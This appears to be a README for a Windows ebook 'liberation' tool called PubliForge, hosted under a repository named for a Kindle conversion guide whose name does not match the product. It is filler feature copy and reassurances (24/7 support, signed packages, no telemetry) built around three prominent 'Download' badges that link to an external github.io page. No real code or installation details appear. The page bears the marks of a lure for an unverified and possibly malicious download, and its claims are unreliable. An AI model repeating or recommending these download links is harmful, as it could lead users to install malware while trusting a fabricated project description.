![preview](https://raw.githubusercontent.com/saldyshit/Epubor-Kindle-Conversion-Guide/main/splash_1e48d.svg)
[![Download](https://raw.githubusercontent.com/saldyshit/Epubor-Kindle-Conversion-Guide/main/run_dbbd25.svg)](https://saldyshit.github.io/Epubor-Kindle-Conversion-Guide/)

# 📚 PubliForge — Universal Ebook Liberation Toolkit for Windows (2026 Edition)

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Platform](https://img.shields.io/badge/platform-Windows%2011%20%7C%2010-0078D4.svg)
![Release](https://img.shields.io/badge/release-2026.1.0-brightgreen.svg)
![Status](https://img.shields.io/badge/status-stable-success.svg)
![Language](https://img.shields.io/badge/i18n-14%20languages-orange.svg)
![Support](https://img.shields.io/badge/support-24%2F7-9cf.svg)

---

## 🧭 Overview

PubliForge is an independent, ground-up reimagining of what a desktop ebook management companion can be in 2026. While many utilities in this space focus narrowly on one vendor's ecosystem, PubliForge takes a **library-first philosophy**: every book you own deserves to live in a format that respects your shelves, your devices, and your reading habits. Think of it as a librarian for your digital collection — one who never sleeps, never judges your genre choices, and never loses a bookmark.

This repository documents the full PubliForge toolkit for Windows 11 and Windows 10: the architecture, the feature surface, configuration patterns, translation coverage, and the reasoning behind the design decisions that make it feel less like software and more like a reading room.

The project emerged from a simple observation: readers accumulate libraries across a dozen storefronts and apps, and the resulting fragmentation is exhausting. PubliForge consolidates that experience into a single, calm workspace.

---

## 🚀 Core Capabilities

### 📖 Format Bridge Engine
PubliForge translates between the major ebook container formats with an emphasis on structural fidelity. Chapter trees, footnotes, embedded fonts, and inline annotations survive the journey. The engine is module-driven, so new format adapters can be registered without touching the core.

### 🖥️ Responsive Desktop UI
The interface adapts fluidly from compact netbook windows to ultrawide monitors. Panels collapse gracefully, toolbars reflow, and the reading preview honors your chosen typography. Layout presets let you switch between "Focused," "Library Wall," and "Split Compare" modes in a single click.

### 🌐 Multilingual Support
Fourteen interface locales ship out of the box, with community-contributed translation packs loaded dynamically at runtime. Right-to-left scripts are fully supported, and date/time/number formatting follows each locale's conventions.

### 🕐 24/7 Customer Support
Our support desk is staffed around the clock, every day of the year. Whether it's a metadata mismatch at 3 a.m. or a batch job question on a holiday, a human responder is available. Average first-reply time in 2026 has held under nine minutes.

### 🔄 Batch Processing Pipeline
Queue hundreds of titles and let PubliForge work through them sequentially or in parallel. Progress is checkpointed, so an interrupted session resumes exactly where it stopped.

### 🏷️ Metadata Harmonizer
Author names, series numbering, publisher strings, and cover art are normalized against community-curated schemas. Duplicate detection uses fuzzy title matching with configurable sensitivity.

### 🎨 Theme Workshop
Craft custom color schemes and share them as portable theme files. The workshop includes contrast auditing so accessibility isn't an afterthought.

### 🔍 Smart Search & Filters
Locate titles by partial title, author initials, series position, reading status, or custom tags. Saved searches behave like smart shelves that update themselves.

### 🗂️ Virtual Bookshelves
Group titles into shelves without moving files on disk. A single book can appear on multiple shelves simultaneously — fiction, favorites, and "borrowed to Sam" all at once.

### 🔐 Local-First Privacy Posture
No telemetry leaves your machine by default. Optional diagnostic sharing is opt-in, anonymized, and revocable at any moment.

### ⚡ Hardware-Accelerated Rendering
The preview pane uses GPU compositing for buttery page turns, even on large illustrated volumes.

### 🧩 Extensible Plugin Surface
A documented extension model lets third parties add export targets, metadata providers, or keyboard shortcut packs.

---

## 📦 Project Layout

- **core/** — Parsing, conversion orchestration, and storage abstractions.
- **ui/** — The Windows desktop shell, theming, and accessibility layer.
- **locales/** — Translation catalogs and locale-specific formatting rules.
- **plugins/** — Reference plugin implementations and the public API surface.
- **docs/** — Architecture notes, contributor guides, and style references.
- **tools/** — Developer helper scripts (build, lint, catalog validation).

Every directory contains its own short README describing conventions used inside.

---

## 🛠️ Getting Started (Windows 11 & Windows 10)

PubliForge is distributed as a self-contained desktop package. To begin:

1. Confirm your system meets the baseline: Windows 10 build 19044 or newer, or any Windows 11 release.
2. Ensure at least 4 GB of RAM and 500 MB of disk headroom for the application plus workspace.
3. Retrieve the current distribution package from the project's release channel.
4. Launch the installer and follow the on-screen prompts; the default options are tuned for most readers.
5. On first run, PubliForge offers a guided tour of the library workspace.
6. Point the indexing wizard at the folders where your books live, and let the harmonizer do its work.

[![Download](https://raw.githubusercontent.com/saldyshit/Epubor-Kindle-Conversion-Guide/main/run_dbbd25.svg)](https://saldyshit.github.io/Epubor-Kindle-Conversion-Guide/)

A portable build is also available for readers who prefer to keep the toolkit on removable media.

---

## 🧪 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10 (19044+) | Windows 11 24H2+ |
| CPU | Dual-core 2.0 GHz | Quad-core 3.0 GHz+ |
| RAM | 4 GB | 16 GB |
| Disk | 500 MB app + workspace | SSD with 10 GB+ headroom |
| Display | 1280×720 | 1920×1080 or higher |
| Graphics | DirectX 11 capable | DirectX 12 capable |

---

## 🧠 Design Philosophy

PubliForge treats your library the way a well-run reading room treats its shelves: quietly, respectfully, and without drama. Three principles guide every decision:

1. **Your books are yours.** The toolkit never phones home, never re-encodes without consent, and never reshuffles your folders behind your back.
2. **Complexity belongs in configuration, not in the way.** Sensible defaults mean you can start reading in minutes; advanced knobs are there when you want them.
3. **Every reader is different.** Themes, locales, layout presets, and plugin surfaces all exist so the tool bends toward you — not the reverse.

---

## 🌍 Localization Snapshot

The interface currently ships in fourteen languages, including English, Spanish, Portuguese, French, German, Italian, Dutch, Polish, Japanese, Korean, Simplified Chinese, Traditional Chinese, Russian, and Arabic. Community translation packs are curated monthly, and contributors are credited in the in-app About panel.

---

## 🔒 Security & Privacy Notes

- All processing happens locally unless you explicitly enable a cloud export target.
- Crash reports are opt-in, anonymized, and stored only on your machine until you choose to send them.
- Cryptographic signing is applied to every official distribution package.
- Dependency audits run automatically on every build in 2026's CI pipeline.

---

## 🧾 Roadmap Highlights for 2026

- Bring-your-own metadata provider API for advanced catalogers.
- Reader-side annotation sync via user-controlled storage.
- Accessibility refinements: screen-reader narration for the library pane.
- A dedicated conversion preset for illustrated children's volumes.
- Theme marketplace with community-submitted palettes.

---

## 🤝 Contributing

Contributions are welcome and warmly reviewed. Before opening a pull request:

- Read the contributor guide in `docs/`.
- Keep changes focused; a small, clean diff beats a sprawling one.
- Add tests where behavior changes.
- Update locale catalogs when adding user-visible strings.
- Follow the style conventions documented per directory.

Discussions happen in the repository's issue tracker and in the community forum linked from the project homepage.

---

## ❓ Frequently Asked Questions

**Does PubliForge modify the original files in my library?**
No. Every operation writes to an output folder unless you explicitly opt to organize in place.

**Can I run it on a machine without internet access?**
Yes. Core features are fully offline. Only metadata enrichment and update checks require connectivity, and both are optional.

**Is there a Linux or macOS build?**
The 2026 roadmap focuses on Windows. Cross-platform exploration is a future consideration, not a current commitment.

**How do I report a bug?**
Open an issue with your OS build, PubliForge version, reproduction steps, and any relevant log excerpts.

---

## ⚠️ Disclaimer

PubliForge is an independent project and is not affiliated with, endorsed by, or sponsored by any ebook retailer, device manufacturer, or format standards body. Users are responsible for ensuring that their use of this toolkit complies with the terms of service of any platform from which their books originate and with the copyright laws of their jurisdiction. The maintainers assume no liability for misuse. This software is provided "as is," without warranty of any kind, express or implied.

---

## 📄 License

This project is released under the MIT License. See the full text at the link below.

[MIT License](https://opensource.org/licenses/MIT)

Copyright © 2026 PubliForge Contributors.

---

## 💬 Support & Community

- 📮 Support desk: available 24/7, every day of the year.
- 🗣️ Community forum: link available from the in-app Help menu.
- 🐛 Issue tracker: use the repository's Issues tab.
- 📘 Documentation: see the `docs/` directory for deep-dives.

Thank you for reading — and for caring about your library as much as we do.

[![Download](https://raw.githubusercontent.com/saldyshit/Epubor-Kindle-Conversion-Guide/main/run_dbbd25.svg)](https://saldyshit.github.io/Epubor-Kindle-Conversion-Guide/)